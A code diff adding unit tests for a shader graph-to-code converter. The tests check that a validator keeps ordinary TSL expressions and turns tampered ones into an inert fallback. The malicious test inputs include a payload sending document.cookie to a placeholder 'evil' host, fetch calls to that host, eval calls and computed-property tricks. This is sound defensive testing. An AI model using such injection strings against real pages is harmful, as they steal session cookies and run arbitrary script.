@@ -168,6 +168,44 @@ describe('graphToCode — unknown nodes', () => {
     const { code } = graphToCode([u, out], [makeEdge('u', 'out', 'out', 'color')]);
     expect(code).toContain('const mysteryFn1 = mysteryFn(1, 2, 3);');
   });
+
+  // Legitimate TSL shapes that codeToGraph can legitimately capture must still
+  // survive the validator, including nested calls, swizzles, and arithmetic.
+  it.each([
+    'mysteryFn(vec3(1, 2, 3), 0.5)',
+    'mysteryFn(positionLocal.mul(2.0))',
+    'mysteryFn(uv().x, -1.0)',
+    'mysteryFn(a, b, c)',
+  ])('preserves a legitimate expression: %s', (rawExpression) => {
+    const u = makeNode('u', 'unknown', { functionName: 'mysteryFn', rawExpression });
+    const out = makeNode('out', 'output');
+    const { code } = graphToCode([u, out], [makeEdge('u', 'out', 'out', 'color')]);
+    expect(code).toContain(`const mysteryFn1 = ${rawExpression};`);
+  });
+
+  // A tampered .fastshader/.js could swap rawExpression for code that executes
+  // in the preview iframe. The validator must replace anything that isn't a
+  // pure data/TSL expression with the inert `float(0)` fallback. (Defense in
+  // depth — the preview iframe is also sandboxed to an opaque origin.)
+  it.each([
+    ['IIFE arrow argument', 'mysteryFn((() => { window.location = "http://evil/" + document.cookie })())'],
+    ['fetch in argument', 'mysteryFn(fetch("http://evil"))'],
+    ['bare eval call', 'eval("alert(1)")'],
+    ['forbidden global in argument', 'mysteryFn(window.document.cookie)'],
+    ['member-expression callee', 'window.fetch("http://evil")'],
+    ['statement list', 'mysteryFn(); fetch("http://evil")'],
+    ['assignment in argument', 'mysteryFn(window.name = "x")'],
+    ['computed property access', 'mysteryFn(self["eval"]("x"))'],
+  ])('neutralizes a malicious expression (%s) to float(0)', (_label, rawExpression) => {
+    const u = makeNode('u', 'unknown', { functionName: 'mysteryFn', rawExpression });
+    const out = makeNode('out', 'output');
+    const { code } = graphToCode([u, out], [makeEdge('u', 'out', 'out', 'color')]);
+    expect(code).toContain('const mysteryFn1 = float(0);');
+    expect(code).not.toContain('fetch');
+    expect(code).not.toContain('window');
+    expect(code).not.toContain('eval');
+    expect(code).not.toContain('document');
+  });
 });
 
 describe('graphToCode — split node swizzle inlining', () => {
